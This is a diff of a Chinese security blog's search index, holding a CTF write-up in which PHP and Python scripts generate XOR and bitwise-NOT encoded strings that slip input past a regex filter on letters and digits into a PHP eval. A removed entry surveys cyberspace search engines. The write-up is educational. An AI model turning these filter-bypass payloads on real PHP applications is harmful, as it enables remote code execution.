(<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+<p>接着运行上面的python脚本即可，运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>搞渗透</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
       </tags>
   </entry>
   <entry>
@@ -3156,34 +3383,11 @@
 </ol>
 ]]></content>
       <categories>
-        <category>搞渗透之内网安全</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>2021 GUET梦极光杯</title>
-    <url>/2022/01/08/%E6%90%9E%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<p>有一道web题，源码如下：</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&quot;/[A-Za-z0-9;()]/&quot;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        ob_start();</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo &quot;</span> . <span class="variable">$code</span> . <span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="variable">$output</span> = ob_get_contents();</span><br><span class="line">        ob_clean();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> === <span class="string">&quot;guetctf&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> getenv(<span class="string">&quot;FLAG&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>很明显可以看到我们要构造 <strong>‘ code=guetctf ’</strong> 才能解开，但是正则表达式把所有的字母和数字都过滤掉了，因此我们要通过其他方法来进行绕过</p>
-<h3 id="一、异或"><a href="#一、异或" class="headerlink" title="一、异或"></a>一、异或</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[A-Za-z0-9;()]/i&#x27;</span>; <span class="comment">//可以根据题目给的正则表达式进行修改</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">               &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)^urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>将上面的php脚本运行之后生成一个txt文档，里面包含了所有字符的异或构造结果 </p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = <span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    param = action(<span class="built_in">input</span>(<span class="string">&quot;\nyour input：&quot;</span>))</span><br><span class="line">    <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
-<p>接着运行上面的python脚本即可，运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input：guetctf</span><br><span class="line">&quot;%07%08%05%08%03%08%06&quot;^&quot;%60%7d%60%7c%60%7c%60&quot;</span><br></pre></td></tr></table></figure>
-<h3 id="二、取反"><a href="#二、取反" class="headerlink" title="二、取反"></a>二、取反</h3><p>直接在命令行中运行这个php脚本即可</p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;your input: &#x27;</span>);</span><br><span class="line"><span class="variable">$input</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN)); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*]&#x27;</span>.<span class="string">&#x27;~&#x27;</span>.urlencode(~<span class="variable">$input</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>运行结果：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">your input: guetctf</span><br><span class="line">[*]~%98%8A%9A%8B%9C%8B%99</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
         <category>搞渗透</category>
       </categories>
       <tags>
-        <tag>web</tag>
+        <tag>渗透测试</tag>
+        <tag>learn</tag>
       </tags>
   </entry>
   <entry>
@@ -3307,25 +3511,6 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网络空间搜索引擎</title>
-    <url>/2022/10/09/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/</url>
-    <content><![CDATA[<h1 id="ZoomEye"><a href="#ZoomEye" class="headerlink" title="ZoomEye"></a>ZoomEye</h1><p><a href="https://www.zoomeye.org/"><strong>ZoomEye</strong></a>是由国内互联网安全厂商<strong>知道创宇</strong>制作的一款网络空间搜索引擎，通过浏览器可以快速搜索网络设备。<strong>ZoomEye</strong>支持公网设备指纹检索和 Web 指纹检索。网站指纹包括应用名、版本、前端框架、后端框架、服务端语言、服务器操作系统、网站容器、内容管理系统和数据库等。设备指纹包括应用名、版本、开放端口、操作系统、服务名、地理位置等，侧重于Web层面的资产发现。</p>
-<p><img src="/2022/10/09/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/1.png" alt="ZoomEye"></p>
-<h1 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h1><p><a href="https://www.shodan.io/"><strong>Shodan</strong></a>是全球第一个网络空间搜索引擎，它使用户可以搜索连接Internet的设备和明确的网站信息，例如在特定系统上运行的软件类型和本地匿名FTP服务器。查找在线存在的特定设备和设备类型。就像互联网地图一样，它使我们可以查看连接到哪个设备或在特定设备上打开了端口，或特定系统正在使用哪个操作系统等。</p>
-<p><img src="/2022/10/09/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/2.png" alt="Shodan"></p>
-<h1 id="FOFA"><a href="#FOFA" class="headerlink" title="FOFA"></a>FOFA</h1><p><a href="https://fofa.info/"><strong>FOFA</strong></a>是白帽汇推出的网络空间测绘引擎。白帽汇是一家专注于网络空间测绘与前沿技术研究的互联网安全公司，主要从事网络安全产品开发与服务支撑等相关工作，为国家监管部门及政企用户提供综合性整体解决方案，有效提升网络安全整体防御实力。</p>
-<p><img src="/2022/10/09/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/3.png" alt="FOFA"></p>
-<h1 id="Quake"><a href="#Quake" class="headerlink" title="Quake"></a>Quake</h1><p><a href="https://quake.360.net/quake/#/index"><strong>Quake</strong></a>是360网络安全响应中心（360-CERT）自主设计研发的全球网络空间测绘系统，能够对全球IPv4、IPv6地址进行持续性探测，实时感知全球网络空间中各类资产并发现其安全风险。</p>
-<p><img src="/2022/10/09/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E/4.png" alt="Quake"></p>
-]]></content>
-      <categories>
-        <category>基础知识和笔记</category>
-      </categories>
-      <tags>
-        <tag>learn</tag>
       </tags>
   </entry>
 </search>
